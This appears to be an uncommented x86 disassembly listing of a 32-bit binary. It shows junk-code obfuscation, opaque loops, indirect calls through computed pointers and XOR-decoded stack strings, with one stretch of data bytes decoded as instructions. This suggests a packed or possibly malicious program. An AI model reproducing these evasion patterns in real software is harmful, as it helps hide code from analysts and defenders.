  4237c9:	mov    eax,DWORD PTR [ebp-0x24]
  4237cc:	sub    eax,edi
  4237ce:	lea    ecx,[ebx-0x3272ec]
  4237d4:	add    DWORD PTR ds:0x42861f,0x137d
  4237de:	xor    eax,esi
  4237e0:	adc    DWORD PTR ds:0x428667,0x428613
  4237ea:	xor    ecx,esi
  4237ec:	cmp    ecx,eax
  4237ee:	je     0x423b13
  4237f4:	and    DWORD PTR ds:0x428667,0x0
  4237fe:	mov    eax,ds:0x428667
  423803:	inc    eax
  423804:	mov    ds:0x428667,eax
  423809:	cmp    DWORD PTR ds:0x428667,0x22
  423810:	jge    0x423833
  423816:	jmp    0x423826
  42381b:	push   0x428056
  423820:	call   DWORD PTR ds:0x4287af
  423826:	cmp    DWORD PTR ds:0x428667,0x14
  42382d:	jb     0x4237fe
  423833:	mov    eax,DWORD PTR [ebp-0x4]
  423836:	add    DWORD PTR ds:0x42862b,0x428657
  423840:	xor    eax,esi
  423842:	add    eax,edi
  423844:	mov    DWORD PTR ds:0x42863b,0x5900
  42384e:	cmp    ebx,eax
  423850:	mov    DWORD PTR ds:0x42864b,0x1e0f
  42385a:	jne    0x423a61
  423860:	sbb    DWORD PTR ds:0x42866f,0x4285df
  42386a:	push   DWORD PTR [ebp+0x8]
  42386d:	sub    DWORD PTR ds:0x428653,0x2050
  423877:	call   0x423453
  42387c:	mov    DWORD PTR [ebp-0x14],eax
  42387f:	mov    eax,DWORD PTR [ebp-0x4]
  423882:	xor    DWORD PTR ds:0x428603,0x42865b
  42388c:	mov    ecx,DWORD PTR [ebp-0x14]
  42388f:	sbb    DWORD PTR ds:0x42866f,0x5022
  423899:	xor    eax,esi
  42389b:	adc    DWORD PTR ds:0x42867b,0x428657
  4238a5:	add    eax,edi
  4238a7:	mov    DWORD PTR ds:0x4285e7,0x3cb8
  4238b1:	cmp    ecx,eax
  4238b3:	je     0x423bf6
  4238b9:	sbb    DWORD PTR ds:0x4285ef,0x428613
  4238c3:	push   DWORD PTR [ebp-0x14]
  4238c6:	or     DWORD PTR ds:0x42866b,0x13a4
  4238d0:	push   DWORD PTR [ebp+0x8]
  4238d3:	and    DWORD PTR ds:0x4285cf,0x6488
  4238dd:	call   0x423513
  4238e2:	mov    DWORD PTR [ebp-0x14],eax
  4238e5:	mov    ecx,DWORD PTR ds:0x4286c7
  4238eb:	mov    eax,ds:0x4286ff
  4238f0:	sub    ecx,eax
  4238f2:	sub    ecx,DWORD PTR [ecx+eax*1]
  4238f5:	mov    eax,DWORD PTR [ebp-0x4]
  4238f8:	mov    DWORD PTR ds:0x4285e3,0x1e
  423902:	cmp    DWORD PTR ds:0x4285e3,0x0
  423909:	je     0x423943
  42390f:	cmp    DWORD PTR ds:0x4285e3,0x27
  423916:	ja     0x423943
  42391c:	jmp    0x423931
  423921:	push   0x4c54
  423926:	push   0x42862f
  42392b:	call   DWORD PTR ds:0x4287b3
  423931:	mov    ecx,DWORD PTR ds:0x4285e3
  423937:	dec    ecx
  423938:	mov    DWORD PTR ds:0x4285e3,ecx
  42393e:	jmp    0x423902
  423943:	mov    ecx,DWORD PTR [ebp-0x14]
  423946:	mov    DWORD PTR ds:0x4285f3,0x1814
  423950:	xor    eax,esi
  423952:	add    DWORD PTR ds:0x428657,0x428637
  42395c:	add    eax,edi
  42395e:	mov    DWORD PTR ds:0x42863f,0xaaa
  423968:	cmp    ecx,eax
  42396a:	mov    DWORD PTR ds:0x42860f,0x626d
  423974:	je     0x423bf6
  42397a:	mov    eax,DWORD PTR [ebp-0x14]
  42397d:	or     ecx,0x1da9
  423983:	mov    eax,DWORD PTR [eax+0x18]
  423986:	sub    DWORD PTR ds:0x42865b,ecx
  42398c:	mov    DWORD PTR [ebp-0x24],eax
  42398f:	and    eax,0x4d45
  423994:	mov    eax,DWORD PTR [ebp-0x14]
  423997:	adc    ecx,0x37bd
  42399d:	mov    ecx,DWORD PTR [ebp+0x8]
  4239a0:	add    ecx,DWORD PTR [eax+0x20]
  4239a3:	movzx  eax,WORD PTR ds:0x4285d3
  4239aa:	sbb    DWORD PTR ds:0x428657,eax
  4239b0:	mov    DWORD PTR [ebp-0x2c],ecx
  4239b3:	and    DWORD PTR ds:0x428627,0x1b49
  4239bd:	mov    eax,DWORD PTR [ebp-0x14]
  4239c0:	mov    ecx,DWORD PTR [ebp+0x8]
  4239c3:	and    DWORD PTR ds:0x4285db,0x4285ef
  4239cd:	add    ecx,DWORD PTR [eax+0x24]
  4239d0:	adc    DWORD PTR ds:0x4285e3,0x7baf
  4239da:	mov    DWORD PTR [ebp-0x34],ecx
  4239dd:	and    DWORD PTR ds:0x428623,0x0
  4239e7:	jmp    0x4239fa
  4239ec:	xor    eax,eax
  4239ee:	xor    eax,DWORD PTR ds:0x428623
  4239f4:	inc    eax
  4239f5:	mov    ds:0x428623,eax
  4239fa:	cmp    DWORD PTR ds:0x428623,0x1a
  423a01:	jae    0x423a3c
  423a07:	cmp    DWORD PTR ds:0x428623,0xd
  423a0e:	jb     0x423a3c
  423a14:	jmp    0x423a1f
  423a19:	call   DWORD PTR ds:0x4287b7
  423a1f:	cmp    DWORD PTR ds:0x428623,0xc
  423a26:	jne    0x423a37
  423a2c:	mov    eax,ds:0x428623
  423a31:	inc    eax
  423a32:	mov    ds:0x428623,eax
  423a37:	jmp    0x4239ec
  423a3c:	mov    eax,DWORD PTR [ebp-0x14]
  423a3f:	mov    ecx,DWORD PTR [ebp+0x8]
  423a42:	xor    DWORD PTR ds:0x428603,0x1ba
  423a4c:	add    ecx,DWORD PTR [eax+0x1c]
  423a4f:	mov    DWORD PTR [ebp-0x14],ecx
  423a52:	mov    DWORD PTR ds:0x4285df,0x6d54
  423a5c:	jmp    0x423bb4
  423a61:	sbb    DWORD PTR ds:0x428657,0x267e
  423a6b:	mov    eax,DWORD PTR [ebp-0x2c]
  423a6e:	and    DWORD PTR ds:0x42865f,0x0
  423a78:	mov    ecx,DWORD PTR ds:0x42865f
  423a7e:	inc    ecx
  423a7f:	mov    DWORD PTR ds:0x42865f,ecx
  423a85:	cmp    DWORD PTR ds:0x42865f,0x24
  423a8c:	jl     0x423aaf
  423a92:	jmp    0x423aa2
  423a97:	push   0x3051
  423a9c:	call   DWORD PTR ds:0x4287bb
  423aa2:	cmp    DWORD PTR ds:0x42865f,0x1e
  423aa9:	jb     0x423a78
  423aaf:	mov    ecx,DWORD PTR [ebp+0x8]
  423ab2:	add    DWORD PTR ds:0x428617,0x4285ef
  423abc:	add    ecx,DWORD PTR [eax+ebx*4]
  423abf:	movzx  eax,BYTE PTR ds:0x4285d3
  423ac6:	or     eax,DWORD PTR ds:0x428633
  423acc:	mov    ds:0x4285d3,eax
  423ad1:	mov    DWORD PTR [ebp-0x28],ecx
  423ad4:	mov    eax,DWORD PTR [ebp-0x4]
  423ad7:	xor    DWORD PTR ds:0x42860b,0x227b
  423ae1:	mov    ecx,DWORD PTR [ebp-0x28]
  423ae4:	mov    DWORD PTR ds:0x428657,0x956
  423aee:	xor    eax,esi
  423af0:	add    DWORD PTR ds:0x428637,0x428663
  423afa:	add    eax,edi
  423afc:	mov    DWORD PTR ds:0x42862f,0x1972
  423b06:	cmp    ecx,eax
  423b08:	je     0x423bb4
  423b0e:	jmp    0x423b73
  423b13:	mov    eax,DWORD PTR [ebp-0x4]
  423b16:	mov    DWORD PTR ds:0x42866f,0x10fc
  423b20:	mov    ecx,DWORD PTR [ebp-0x8]
  423b23:	or     DWORD PTR ds:0x42866f,0x42865f
  423b2d:	xor    eax,esi
  423b2f:	adc    DWORD PTR ds:0x4285eb,0x240b
  423b39:	add    eax,edi
  423b3b:	mov    DWORD PTR ds:0x428657,0x63ac
  423b45:	cmp    ecx,eax
  423b47:	mov    eax,DWORD PTR [ebp-0x4]
  423b4a:	je     0x423bf9
  423b50:	mov    ecx,DWORD PTR [ebp-0x30]
  423b53:	xor    eax,esi
  423b55:	mov    DWORD PTR ds:0x428613,0x1e55
  423b5f:	add    eax,edi
  423b61:	mov    DWORD PTR ds:0x428637,0x6483
  423b6b:	cmp    ecx,eax
  423b6d:	je     0x423c02
  423b73:	adc    DWORD PTR ds:0x428603,0x42865b
  423b7d:	lea    eax,[ebp-0x8]
  423b80:	sub    DWORD PTR ds:0x428603,0x42860b
  423b8a:	push   eax
  423b8b:	sbb    DWORD PTR ds:0x42861b,0x4285f7
  423b95:	push   DWORD PTR [ebp-0x28]
  423b98:	sub    DWORD PTR ds:0x428617,0x428667
  423ba2:	push   DWORD PTR [ebp+0xc]
  423ba5:	adc    DWORD PTR ds:0x42863f,0x428633
  423baf:	call   0x40f467
  423bb4:	sub    DWORD PTR ds:0x4285d7,0x3834
  423bbe:	mov    eax,DWORD PTR [ebp-0x4]
  423bc1:	mov    ecx,DWORD PTR [ebp-0x8]
  423bc4:	xor    eax,esi
  423bc6:	add    eax,edi
  423bc8:	cmp    ecx,eax
  423bca:	je     0x423be5
  423bd0:	mov    eax,DWORD PTR [ebp-0x34]
  423bd3:	movzx  eax,WORD PTR [eax+ebx*2]
  423bd7:	mov    ecx,DWORD PTR [ebp-0x14]
  423bda:	mov    eax,DWORD PTR [ecx+eax*4]
  423bdd:	mov    DWORD PTR [ebp-0x38],eax
  423be0:	jmp    0x423b13
  423be5:	mov    eax,DWORD PTR [ebp-0xc]
  423be8:	xor    eax,esi
  423bea:	lea    ebx,[ebx+eax*1+0x3272ec]
  423bf1:	jmp    0x4237c3
  423bf6:	mov    eax,DWORD PTR [ebp-0x4]
  423bf9:	xor    eax,esi
  423bfb:	add    eax,edi
  423bfd:	jmp    0x423d1f
  423c02:	mov    eax,DWORD PTR [ebp-0x38]
  423c05:	add    eax,DWORD PTR [ebp+0x8]
  423c08:	mov    DWORD PTR [ebp-0x18],eax
  423c0b:	mov    eax,DWORD PTR [ebp-0x1c]
  423c0e:	test   eax,eax
  423c10:	je     0x423caa
  423c16:	mov    DWORD PTR [ebp-0x20],0x0
  423c1d:	push   0x3
  423c1f:	xor    edx,edx
  423c21:	pop    edx
  423c22:	add    edx,0x8
  423c25:	push   edx
  423c26:	pop    ecx
  423c27:	push   0x6
  423c29:	dec    ecx
  423c2a:	pop    ebx
  423c2b:	dec    ebx
  423c2c:	xchg   ebx,ecx
  423c2e:	sub    ebx,ecx
  423c30:	xchg   ebx,ecx
  423c32:	dec    ecx
  423c33:	mov    eax,DWORD PTR [ebp-0x1c]
  423c36:	imul   eax,ecx
  423c39:	sub    esp,eax
  423c3b:	mov    DWORD PTR [ebp-0x20],esp
  423c3e:	mov    eax,DWORD PTR [ebp-0x4]
  423c41:	xor    eax,esi
  423c43:	add    eax,edi
  423c45:	jmp    0x423c83
  423c4a:	mov    ecx,DWORD PTR [ebp-0xc]
  423c4d:	mov    eax,DWORD PTR [ebp+0x8]
  423c50:	mov    edx,DWORD PTR [ebp+0x14]
  423c53:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  423c57:	xor    ecx,esi
  423c59:	add    ecx,edi
  423c5b:	xor    edx,edx
  423c5d:	div    ecx
  423c5f:	mov    ecx,DWORD PTR [ebp-0x4]
  423c62:	xor    ecx,esi
  423c64:	lea    eax,[ecx+eax*1+0x3272ec]
  423c6b:	mov    ecx,DWORD PTR [ebp+0x8]
  423c6e:	mov    edx,DWORD PTR [ebp-0x20]
  423c71:	mov    DWORD PTR [edx+ecx*4],eax
  423c74:	mov    eax,DWORD PTR [ebp-0xc]
  423c77:	mov    ecx,DWORD PTR [ebp+0x8]
  423c7a:	xor    eax,esi
  423c7c:	lea    eax,[eax+ecx*1+0x3272ec]
  423c83:	mov    DWORD PTR [ebp+0x8],eax
  423c86:	mov    eax,DWORD PTR [ebp-0xc]
  423c89:	mov    ecx,DWORD PTR [ebp+0x14]
  423c8c:	xor    eax,esi
  423c8e:	add    eax,edi
  423c90:	imul   eax,DWORD PTR [ecx]
  423c93:	mov    ecx,DWORD PTR [ebp-0x4]
  423c96:	mov    edx,DWORD PTR [ebp+0x8]
  423c99:	xor    ecx,esi
  423c9b:	lea    ecx,[ecx+edx*1+0x3272ec]
  423ca2:	cmp    ecx,eax
  423ca4:	jne    0x423c4a
  423caa:	mov    eax,DWORD PTR [ebp-0x4]
  423cad:	xor    eax,esi
  423caf:	add    eax,edi
  423cb1:	mov    DWORD PTR [ebp-0x10],eax
  423cb4:	mov    ebx,0x65655
  423cb9:	add    ebx,0x3234
  423cbf:	xchg   ebx,esi
  423cc1:	xor    ebx,ebx
  423cc3:	push   esi
  423cc4:	mov    esi,ebx
  423cc6:	pop    ebx
  423cc7:	mov    edx,esi
  423cc9:	add    ebx,0x1002
  423ccf:	lea    eax,[ebp-0x18]
  423cd2:	add    edx,eax
  423cd4:	add    edx,0x5
  423cd7:	push   edx
  423cd8:	inc    esi
  423cd9:	pop    ecx
  423cda:	dec    ecx
  423cdb:	xchg   ecx,eax
  423cdc:	dec    eax
  423cdd:	xchg   ecx,eax
  423cde:	dec    ecx
  423cdf:	xchg   ecx,edx
  423ce1:	dec    edx
  423ce2:	push   edx
  423ce3:	mov    edx,ebx
  423ce5:	pop    ebx
  423ce6:	dec    ebx
  423ce7:	call   DWORD PTR [ebx]
  423ce9:	cmp    DWORD PTR [ebp+0x10],esi
  423cec:	je     0x423d0b
  423cf2:	xchg   edx,eax
  423cf3:	push   0xb
  423cf5:	pop    ecx
  423cf6:	push   0x4
  423cf8:	pop    ebx
  423cf9:	inc    ebx
  423cfa:	xchg   ebx,ecx
  423cfc:	sub    ebx,ecx
  423cfe:	xchg   ebx,ecx
  423d00:	dec    ecx
  423d01:	dec    ecx
  423d02:	mov    eax,DWORD PTR [ebp-0x1c]
  423d05:	imul   eax,ecx
  423d08:	add    esp,eax
  423d0a:	xchg   edx,eax
  423d0b:	push   eax
  423d0c:	xor    ebx,ebx
  423d0e:	mov    edx,esp
  423d10:	dec    edx
  423d11:	inc    ebx
  423d12:	add    ebx,DWORD PTR [edx+ebx*1]
  423d15:	dec    ebx
  423d16:	xor    edx,edx
  423d18:	add    DWORD PTR [ebp-0x10],ebx
  423d1b:	pop    ebx
  423d1c:	mov    eax,DWORD PTR [ebp-0x10]
  423d1f:	pop    edi
  423d20:	pop    esi
  423d21:	pop    ebx
  423d22:	leave  
  423d23:	ret    0x10
	...
  423d32:	add    BYTE PTR [eax],al
  423d34:	mov    bl,0x8a
  423d36:	test   BYTE PTR [ebp+0x0],0x0
  423d3a:	add    BYTE PTR [eax],al
  423d3c:	add    al,BYTE PTR [eax]
  423d3e:	add    BYTE PTR [eax],al
  423d40:	xor    al,0x0
  423d42:	add    BYTE PTR [eax],al
  423d44:	push   eax
  423d45:	cmp    eax,0x31500002
  423d4a:	add    al,BYTE PTR [eax]
  423d4c:	add    BYTE PTR [eax],al
  423d4e:	add    BYTE PTR [eax],al
  423d50:	push   edx
  423d51:	push   ebx
  423d52:	inc    esp
  423d53:	push   ebx
  423d54:	shr    DWORD PTR [ebx+ecx*8-0x49],0xf5
  423d59:	test   eax,0xa6914e0f
  423d5e:	loopne 0x423d1b
  423d60:	inc    eax
  423d61:	sbb    BYTE PTR [eax+0x14a],bl
  423d67:	add    BYTE PTR [ebp+0x3a],al
  423d6a:	pop    esp
  423d6b:	push   edx
  423d6c:	popa   
  423d6d:	ja     0x423d8f
  423d6f:	inc    esp
  423d70:	popa   
  423d71:	je     0x423dd4
  423d73:	pop    esp
  423d74:	inc    ebp
  423d75:	outs   dx,BYTE PTR ds:[esi]
  423d76:	arpl   WORD PTR [edi+0x64],bp
  423d79:	gs fs inc esp
  423d7c:	popa   
  423d7d:	je     0x423de0
  423d7f:	inc    esi
  423d80:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x81ec558b
  423d88:	in     al,dx
  423d89:	or     BYTE PTR [ecx],al
  423d8b:	add    BYTE PTR [eax],al
  423d8d:	push   ebx
  423d8e:	mov    eax,ebx
  423d90:	xchg   ecx,eax
  423d91:	mov    eax,DWORD PTR [ebp+0x8]
  423d94:	cmp    eax,0xf89c85b0
  423d99:	jne    0x424220
  423d9f:	mov    eax,DWORD PTR [ebp+0xc]
  423da2:	cmp    eax,0xf89c85b1
  423da7:	jne    0x424220
  423dad:	mov    eax,DWORD PTR [ebp+0x24]
  423db0:	mov    DWORD PTR [ebp-0x4],eax
  423db3:	mov    BYTE PTR [ebp-0x18],0x13
  423db7:	mov    BYTE PTR [ebp-0x17],0x1e
  423dbb:	mov    BYTE PTR [ebp-0x16],0x15
  423dbf:	mov    BYTE PTR [ebp-0x15],0x4f
  423dc3:	mov    BYTE PTR [ebp-0x14],0x4c
  423dc7:	mov    BYTE PTR [ebp-0x13],0x7a
  423dcb:	mov    BYTE PTR [ebp-0x20],0x1
  423dcf:	mov    BYTE PTR [ebp-0x1f],0xf
  423dd3:	mov    BYTE PTR [ebp-0x1e],0x11
  423dd7:	mov    BYTE PTR [ebp-0x1d],0xc
  423ddb:	mov    BYTE PTR [ebp-0x1c],0x4f
  423ddf:	mov    BYTE PTR [ebp-0x1b],0x4c
  423de3:	mov    BYTE PTR [ebp-0x1a],0x7a
  423de7:	mov    BYTE PTR [ebp-0x28],0xf
  423deb:	mov    BYTE PTR [ebp-0x27],0x12
  423def:	mov    BYTE PTR [ebp-0x26],0x16
  423df3:	mov    BYTE PTR [ebp-0x25],0x3
  423df7:	mov    BYTE PTR [ebp-0x24],0x1d
  423dfb:	mov    BYTE PTR [ebp-0x23],0xa
  423dff:	push   esi
  423e00:	mov    BYTE PTR [ebp-0x22],0x15
  423e04:	mov    BYTE PTR [ebp-0x21],0x7a
  423e08:	xor    esi,esi
  423e0a:	mov    eax,0xfd
  423e0f:	lea    ecx,[ebp+esi*1-0x18]
  423e13:	movzx  edx,BYTE PTR [ecx]
  423e16:	xor    edx,0x79
  423e19:	add    edx,eax
  423e1b:	inc    esi
  423e1c:	mov    BYTE PTR [ecx],dl
  423e1e:	cmp    esi,0x6
  423e21:	jb     0x423e0f
  423e23:	xor    esi,esi
  423e25:	lea    ecx,[ebp+esi*1-0x20]
  423e29:	movzx  edx,BYTE PTR [ecx]
  423e2c:	xor    edx,0x79
  423e2f:	add    edx,eax
  423e31:	inc    esi
  423e32:	mov    BYTE PTR [ecx],dl
  423e34:	cmp    esi,0x7
  423e37:	jb     0x423e25
  423e39:	xor    esi,esi
  423e3b:	lea    ecx,[ebp+esi*1-0x28]
  423e3f:	movzx  edx,BYTE PTR [ecx]
  423e42:	xor    edx,0x79
  423e45:	add    edx,eax
  423e47:	inc    esi
  423e48:	mov    BYTE PTR [ecx],dl
  423e4a:	cmp    esi,0x8
  423e4d:	jb     0x423e3b
  423e4f:	lea    eax,[ebp-0x2c]
  423e52:	mov    DWORD PTR [ebp-0x8],eax
  423e55:	mov    ecx,DWORD PTR [ebp-0x8]
  423e58:	mov    eax,0x7113fcce
  423e5d:	mov    DWORD PTR [ecx],eax
  423e5f:	mov    ecx,DWORD PTR [ebp-0x2c]
  423e62:	push   edi
  423e63:	mov    esi,0x4e3e
  423e68:	mov    ebx,0x3272ec
  423e6d:	cmp    ecx,eax
  423e6f:	jne    0x423f3a
  423e75:	lea    eax,[esi+0x29]
  423e78:	mov    WORD PTR [ebp-0x78],ax
  423e7c:	mov    eax,esi
  423e7e:	mov    WORD PTR [ebp-0x76],ax
  423e82:	add    eax,0x3b
  423e85:	mov    WORD PTR [ebp-0x74],ax
  423e89:	lea    eax,[esi-0x6]
  423e8c:	mov    WORD PTR [ebp-0x72],ax
  423e90:	add    eax,0x47
  423e93:	mov    ecx,eax
  423e95:	lea    eax,[esi-0x1d]
  423e98:	mov    WORD PTR [ebp-0x66],ax
  423e9c:	mov    eax,esi
  423e9e:	mov    WORD PTR [ebp-0x64],ax
  423ea2:	add    eax,0xffffffe4
  423ea5:	mov    WORD PTR [ebp-0x62],ax
  423ea9:	mov    eax,0x44b
  423eae:	mov    WORD PTR [ebp-0x60],ax
  423eb2:	mov    eax,0x5664
  423eb7:	mov    WORD PTR [ebp-0x5e],ax
  423ebb:	mov    eax,0x6104
  423ec0:	mov    WORD PTR [ebp-0x5c],ax
  423ec4:	lea    eax,[ebp-0xe0]
  423eca:	push   eax
  423ecb:	mov    eax,DWORD PTR [ebp+0xc]
  423ece:	mov    edi,0x75108a4
  423ed3:	xor    eax,edi
  423ed5:	add    eax,ebx
  423ed7:	push   eax
  423ed8:	mov    WORD PTR [ebp-0x70],cx
  423edc:	lea    ecx,[esi-0x1a]
  423edf:	mov    edx,ecx
  423ee1:	lea    eax,[ebp-0x78]
  423ee4:	push   eax
  423ee5:	mov    eax,DWORD PTR [ebp-0x4]
  423ee8:	mov    eax,DWORD PTR [eax+0x198]
  423eee:	mov    WORD PTR [ebp-0x6e],dx
  423ef2:	mov    edx,0x4f82
  423ef7:	mov    WORD PTR [ebp-0x6c],dx
  423efb:	mov    DWORD PTR [ebp-0x6a],0x4e7f4e25
  423f02:	mov    DWORD PTR [ebp-0x5a],0x4e24f116
  423f09:	mov    DWORD PTR [ebp-0xe0],0x1
  423f13:	mov    DWORD PTR [ebp-0xdc],0x255
  423f1d:	push   DWORD PTR [eax]
  423f1f:	mov    eax,DWORD PTR [ebp+0x10]
  423f22:	call   eax
  423f24:	mov    DWORD PTR [ebp-0x8],eax
  423f27:	mov    eax,DWORD PTR [ebp-0x8]
  423f2a:	test   eax,eax
  423f2c:	je     0x423f3f
  423f2e:	xor    DWORD PTR ds:0x76586876,0x87687666
  423f38:	jmp    0x423f3f
  423f3a:	mov    edi,0x75108a4
  423f3f:	mov    eax,DWORD PTR [ebp-0x4]
  423f42:	mov    ecx,DWORD PTR [eax+0x18c]
  423f48:	xor    eax,eax
  423f4a:	cmp    DWORD PTR [ecx],eax
  423f4c:	jne    0x4241bb
  423f52:	mov    ecx,DWORD PTR [ebp-0x4]
  423f55:	mov    ecx,DWORD PTR [ecx+0x17c]
  423f5b:	mov    DWORD PTR [ecx],eax
  423f5d:	mov    ecx,DWORD PTR [ebp-0x4]
  423f60:	mov    ecx,DWORD PTR [ecx+0x180]
  423f66:	mov    DWORD PTR [ecx],eax
  423f68:	mov    eax,0x4e69
  423f6d:	mov    WORD PTR [ebp-0x9c],ax
  423f74:	mov    eax,esi
  423f76:	mov    WORD PTR [ebp-0x9a],ax
  423f7d:	mov    eax,0x4e79
  423f82:	mov    WORD PTR [ebp-0x98],ax
  423f89:	add    eax,0xffffffc0
  423f8c:	mov    WORD PTR [ebp-0x96],ax
  423f93:	mov    eax,0x4f8e
  423f98:	mov    WORD PTR [ebp-0x94],ax
  423f9f:	mov    eax,0x4e3a
  423fa4:	mov    WORD PTR [ebp-0x92],ax
  423fab:	add    eax,0x45
  423fae:	mov    WORD PTR [ebp-0x90],ax
  423fb5:	mov    eax,0x4e24
  423fba:	mov    WORD PTR [ebp-0x8e],ax
  423fc1:	mov    eax,esi
  423fc3:	mov    WORD PTR [ebp-0x8c],ax
  423fca:	mov    eax,0x4e25
  423fcf:	mov    WORD PTR [ebp-0x8a],ax
  423fd6:	mov    eax,0x99f9
  423fdb:	mov    WORD PTR [ebp-0x88],ax
  423fe2:	mov    eax,0x8d6a
  423fe7:	mov    WORD PTR [ebp-0x86],ax
  423fee:	mov    eax,0xd66f
  423ff3:	mov    WORD PTR [ebp-0x84],ax
  423ffa:	mov    eax,0xd78b
  423fff:	mov    WORD PTR [ebp-0x82],ax
  424006:	mov    eax,0x27b4
  42400b:	mov    WORD PTR [ebp-0x80],ax
  42400f:	mov    eax,0x47b4
  424014:	mov    WORD PTR [ebp-0x7e],ax
  424018:	mov    eax,0x4e3b
  42401d:	push   0x8
  42401f:	mov    WORD PTR [ebp-0x7c],ax
  424023:	mov    DWORD PTR [ebp-0x10],0x316120f
  42402a:	mov    DWORD PTR [ebp-0xc],0x7a150a1d
  424031:	lea    eax,[ebp-0x10]
  424034:	pop    ecx
  424035:	mov    dl,BYTE PTR [eax]
  424037:	xor    dl,0x79
  42403a:	sub    dl,0x3
  42403d:	mov    BYTE PTR [eax],dl
  42403f:	inc    eax
  424040:	dec    ecx
  424041:	jne    0x424035
  424043:	lea    eax,[ebp-0x10]
  424046:	mov    DWORD PTR [ebp-0xdc],eax
  42404c:	lea    eax,[ebp-0xe0]
  424052:	push   eax
  424053:	mov    eax,DWORD PTR [ebp+0xc]
  424056:	xor    eax,edi
  424058:	add    eax,ebx
  42405a:	push   eax
  42405b:	mov    eax,DWORD PTR [ebp-0x4]
  42405e:	add    eax,0x66
  424061:	push   eax
  424062:	mov    eax,DWORD PTR [ebp-0x4]
  424065:	mov    eax,DWORD PTR [eax+0x198]
  42406b:	mov    DWORD PTR [ebp-0xe0],0x1
  424075:	push   DWORD PTR [eax]
  424077:	mov    eax,DWORD PTR [ebp+0x10]
  42407a:	call   eax
  42407c:	mov    ecx,DWORD PTR [ebp+0x8]
  42407f:	xor    ecx,edi
  424081:	add    ecx,ebx
  424083:	mov    DWORD PTR [ebp-0x8],eax
  424086:	cmp    eax,ecx
  424088:	jne    0x4240a3
  42408a:	mov    eax,ds:0x33730bcf
  42408f:	or     eax,0x22150bce
  424094:	mov    ds:0x33730bcf,eax
  424099:	add    eax,0x3372e92e
  42409e:	mov    ds:0x33730bcf,eax
  4240a3:	mov    ecx,0x4f96
  4240a8:	mov    eax,ecx
  4240aa:	mov    WORD PTR [ebp-0x40],ax
  4240ae:	mov    eax,0x4e63
  4240b3:	mov    edx,eax
  4240b5:	mov    WORD PTR [ebp-0x3e],dx
  4240b9:	lea    edx,[ecx+0x5]
  4240bc:	mov    WORD PTR [ebp-0x3c],dx
  4240c0:	add    edx,0xffffffe8
  4240c3:	mov    WORD PTR [ebp-0x3a],dx
  4240c7:	lea    edx,[ecx-0x9]
  4240ca:	mov    WORD PTR [ebp-0x38],dx
  4240ce:	add    edx,0xfffffffb
  4240d1:	mov    WORD PTR [ebp-0x36],dx
  4240d5:	lea    edx,[ecx+0x21]
  4240d8:	mov    WORD PTR [ebp-0x34],dx
  4240dc:	mov    WORD PTR [ebp-0x32],cx
  4240e0:	mov    ecx,esi
  4240e2:	mov    WORD PTR [ebp-0x30],cx
  4240e6:	lea    ecx,[edx-0x1]
  4240e9:	mov    edx,ecx
  4240eb:	mov    WORD PTR [ebp-0x54],dx
  4240ef:	mov    edx,eax
  4240f1:	mov    WORD PTR [ebp-0x52],dx
  4240f5:	add    edx,0x18
  4240f8:	mov    WORD PTR [ebp-0x50],dx
  4240fc:	mov    WORD PTR [ebp-0x4e],ax
  424100:	add    eax,0xa
  424103:	mov    WORD PTR [ebp-0x4c],ax
  424107:	mov    eax,0x4e68
  42410c:	mov    WORD PTR [ebp-0x4a],ax
  424110:	lea    eax,[ecx-0x1f]
  424113:	mov    WORD PTR [ebp-0x48],ax
  424117:	mov    WORD PTR [ebp-0x46],cx
  42411b:	mov    WORD PTR [ebp-0x44],si
  42411f:	mov    eax,DWORD PTR [ebp+0x8]
  424122:	movzx  ecx,WORD PTR [ebp-0x54]
  424126:	xor    eax,edi
  424128:	add    eax,ebx
  42412a:	xor    eax,ecx
  42412c:	mov    WORD PTR [ebp-0x54],ax
  424130:	mov    eax,DWORD PTR [ebp+0x8]
  424133:	movzx  ecx,WORD PTR [ebp-0x40]
  424137:	xor    eax,edi
  424139:	add    eax,ebx
  42413b:	xor    eax,ecx
  42413d:	mov    WORD PTR [ebp-0x40],ax
  424141:	xor    eax,eax
  424143:	mov    WORD PTR [ebp-0xf4],ax
  42414a:	mov    WORD PTR [ebp-0x108],ax
  424151:	mov    edi,DWORD PTR [ebp+0x24]
  424154:	lea    eax,[ebp-0xf4]
  42415a:	lea    edx,[ebp-0x54]
  42415d:	mov    DWORD PTR [ebp-0xe0],0x2
  424167:	mov    DWORD PTR [ebp-0xdc],eax
  42416d:	call   0x426b83
  424172:	mov    DWORD PTR [ebp-0xd8],eax
  424178:	lea    eax,[ebp-0xe0]
  42417e:	push   eax
  42417f:	mov    eax,DWORD PTR [ebp+0xc]
  424182:	xor    eax,0x75108a4
  424187:	add    eax,ebx
  424189:	push   eax
  42418a:	lea    eax,[ebp-0x9c]
  424190:	push   eax
  424191:	push   DWORD PTR [ebp-0x8]
  424194:	mov    eax,DWORD PTR [ebp+0x10]
  424197:	call   eax
  424199:	mov    edi,DWORD PTR [ebp+0x24]
  42419c:	lea    eax,[ebp-0x108]
  4241a2:	lea    edx,[ebp-0x40]
  4241a5:	mov    DWORD PTR [ebp-0xdc],eax
  4241ab:	call   0x426b83
  4241b0:	mov    DWORD PTR [ebp-0xd8],eax
  4241b6:	mov    edi,0x75108a4
  4241bb:	mov    eax,DWORD PTR [ebp+0x14]
  4241be:	push   DWORD PTR [ebp-0x4]
  4241c1:	push   DWORD PTR [ebp+0x20]
  4241c4:	push   DWORD PTR [ebp+0x1c]
  4241c7:	push   DWORD PTR [ebp+0x18]
  4241ca:	push   DWORD PTR [ebp+0x10]
  4241cd:	push   DWORD PTR [ebp+0x8]
  4241d0:	push   DWORD PTR [ebp+0xc]
  4241d3:	call   0x425420
  4241d8:	test   eax,eax
  4241da:	je     0x42421e
  4241dc:	add    DWORD PTR [ebp-0x4],eax
  4241df:	push   DWORD PTR [ebp-0x4]
  4241e2:	lea    esi,[ebp+0x4]
  4241e5:	call   0x42460e
  4241ea:	mov    eax,DWORD PTR [ebp-0x4]
  4241ed:	mov    eax,DWORD PTR [eax+0x1c8]
  4241f3:	mov    eax,DWORD PTR [eax]
  4241f5:	xor    eax,edi
  4241f7:	add    eax,ebx
  4241f9:	mov    eax,DWORD PTR [ebp-0x4]
  4241fc:	jne    0x424214
  4241fe:	mov    ecx,DWORD PTR [ebp-0x4]
  424201:	mov    ecx,DWORD PTR [ecx+0x1cc]
  424207:	push   DWORD PTR [ecx]
  424209:	mov    eax,DWORD PTR [eax+0x1d8]
